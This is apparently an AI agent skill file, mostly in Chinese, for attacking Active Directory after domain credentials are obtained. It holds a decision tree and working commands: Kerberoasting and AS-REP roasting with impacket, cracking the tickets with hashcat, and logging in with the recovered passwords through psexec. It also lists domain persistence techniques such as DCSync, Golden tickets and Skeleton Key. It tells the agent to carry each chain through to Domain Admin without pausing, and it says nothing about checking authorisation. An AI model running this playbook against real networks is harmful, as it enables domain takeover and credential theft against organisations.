---
name: ad-attack
description: "Active Directory exploitation after domain credentials exist: Kerberos (AS-REP/Kerberoast including cracking the ticket then using the account), delegation, NTLM coercion/relay, lateral movement, ACL abuse, ADCS ESC1-ESC17 and CVE paths, dMSA/BadSuccessor, Kerberos reflection, identity confusion, management-plane, domain trust, and domain persistence. Own the current AD chain through crack-and-use to DA, equivalent domain control, or the targeted host SYSTEM. Do not stop after requesting TGS. Host C2 belongs to /post. Operator chooses next modules."
---

# /ad-attack — 域攻击

> **scope：** 已有域凭据，把 **当前这条 AD 链** 打到 **DA / 等价域控制 / 目标主机 SYSTEM**。要到的 TGS/AS-REP **当场按 etype 砸，爆了立刻用**，不要切 `/creds`。不做主机 C2、数据外带、LSASS 配方。▸ 整条链打完后候选只认 `~/.claude/skills/shared/modules.yaml`（`modules.py tail`）。

工具：`../shared/tools.md`。CVE 有 DC build 才读 `../shared/cve-enrichment.md`。LAPS 读取不在本模块（`../ad-recon/references/windows-laps.md`，仅当你在做 LAPS 卡片）。Kerberoast 砸票查 `-m` 才读 `../creds/references/hash-types.md`（不换模块）。

走到哪条链再 Read 哪一份，禁止开局全读：
- Kerberos 要票+砸 / 委派 → `references/kerberos-attacks.md`
- 横移 → `references/lateral-movement.md`
- ACL → `references/acl-abuse.md`
- ADCS → `references/adcs.md`
- dMSA → `references/dmsa.md`
- 反射 → `references/auth-reflection.md`
- 身份混淆 → `references/identity-confusion.md`
- WAC → `references/management-plane.md`
- Coercion/Relay → `references/authentication-coercion-relay.md`

---

## 开局与收尾

开局第一件事：Read `./notes.md`。没有则 `python ~/.claude/skills/bin/notes.py init`。只按已拿下/凭据继续。
走到哪条链，才 Read **一份** `references/<file>.md`。禁止开局全读、禁止凭记忆写 payload。
监听 / sudo / 输密码 / Permission denied：立刻停，说明等操作者做什么，等回报。不要假装已成功。
收尾：
1. 追加 `./notes.md`
2. `python ~/.claude/skills/bin/modules.py tail <本模块名>`
   Read 备用：`~/.claude/skills/shared/modules.yaml`
   禁止 `./modules.yaml` 和 `python ../bin/...`
3. 优先 `default_next`；`never_default` 不得当作默认（操作者点名除外）
4. 名册外的名字不许建议
5. 停。等操作者选 `/模块` 或 `/clear`
`/edr-bypass` 半条链未完：打通后回本模块，不要 /clear。


---

## 0. 成功条件

当前选中的 AD 链打到目标身份或 DA/主机 SYSTEM。DCSync、Golden、RBCD、Shadow、ESC8/11、Certighost 都是攻击原语。会改密的标 IMPACT/RESTORE。

**不算：** 只列出 SPN、只把 TGS 写到磁盘、只 Coercer scan、只 certipy find。

```text
要票 → 看 etype → hashcat 砸出明文/NT → PTH/PTT/WinRM/ACL
        ↑______________ 全部留在 /ad-attack ______________↑
砸不出来 → 记 notes，换本模块下一条路径。不要因此去 /creds。
```

独立「我手上有一堆无关 hash 要当凭据作业」才由操作者另选 `/creds`。

---

## 0.5 EDR

SMB/LDAP signing、Kerberos 策略、EPA、ACL = 本模块。  
PTH/WinRM/PsExec **已经在目标 OS 执行** 被 AV 杀 → `/edr-bypass` → 回本模块把这条 AD 链打完。

---

## 1. 决策树

```text
只有用户列表            → AS-REP 要票+当场砸 → 用爆出的口令继续
任意域用户              → Kerberoast 要票+看 etype+当场砸 → 用服务账继续
                        委派 → references/kerberos-attacks.md
可 coerce / 入站 NTLM   → references/authentication-coercion-relay.md
                        LDAP/ADCS sink 在这里打完（RBCD/Shadow/ESC8）
票/NT 可登录            → references/lateral-movement.md
ACL 可写                → references/acl-abuse.md
ADCS 模板/CA            → references/adcs.md
2025 DC / dMSA          → references/dmsa.md
Ghost SPN / 反射        → references/auth-reflection.md
可写 UPN + 未补 DC      → references/identity-confusion.md
WAC                     → references/management-plane.md
要域持久化              → DCSync/Golden/Shadow
跨域                    → extra-sid
```

---

## 2. 要票 + 当场砸 + 接着用

```bash
impacket-GetNPUsers corp.com/ -usersfile users.txt -dc-ip DC -format hashcat -outputfile asrep.hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

impacket-GetUserSPNs corp.com/jen:'pass' -dc-ip DC -request -outputfile tgs.hash
grep -o '\$krb5tgs\$[0-9]*\$' tgs.hash
# etype 23
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
# etype 17
hashcat -m 19600 tgs.hash /usr/share/wordlists/rockyou.txt
# etype 18
hashcat -m 19700 tgs.hash /usr/share/wordlists/rockyou.txt
```

不要默认所有 TGS 都是 RC4。完整委派链、失败换路 → `references/kerberos-attacks.md`。字典/规则细节可 Read `../creds/references/offline-crack.md`，**继续在本模块跑 hashcat**。

爆了立刻：

```bash
nxc smb DC -u svc_sql -p 'CrackedPass!'
impacket-psexec corp.com/svc_sql:'CrackedPass!'@TARGET
```

或 NT 已出 → PTH，见 `references/lateral-movement.md`。不要停下来等人选 `/creds`。

---

## 3. Coercion / Relay

PetitPotam / PrinterBug / DFSCoerce / Coercer → LDAP/SMB/ADCS sink：**本模块打完** 到 SYSTEM/RBCD/证书。不要交回 `/creds`。

→ `references/authentication-coercion-relay.md`。2025 新建域默认 LDAP signing，先做 policy gate。

---

## 4. 横移 / ACL / 持久化

→ `references/lateral-movement.md`。落地被杀 → EDR 后回来。

ACL → `references/acl-abuse.md`，改密要 RESTORE。

```text
DCSync / NTDS     有复制权限时打（不是 /creds 收割）
Golden / Silver   有 krbtgt 或服务 NT 之后
Shadow Credentials GenericWrite
Skeleton Key      DC 内存，重启失效，高 IMPACT
```

---

## 5. 2026 证书 / dMSA / 反射

ADCS ESC1–17 / Certighost → `references/adcs.md`  
dMSA / BadSuccessor → `references/dmsa.md`  
反射 / CVE-2026-26128 → `references/auth-reflection.md`  
ResetNightmare 会真改密 → `references/identity-confusion.md`  
WAC 无稳定端到端 PoC → `references/management-plane.md`，不编命令。

---

## 6. 完成后

写入 `./notes.md`。候选只按「开局与收尾」跑 `python ~/.claude/skills/bin/modules.py tail`。
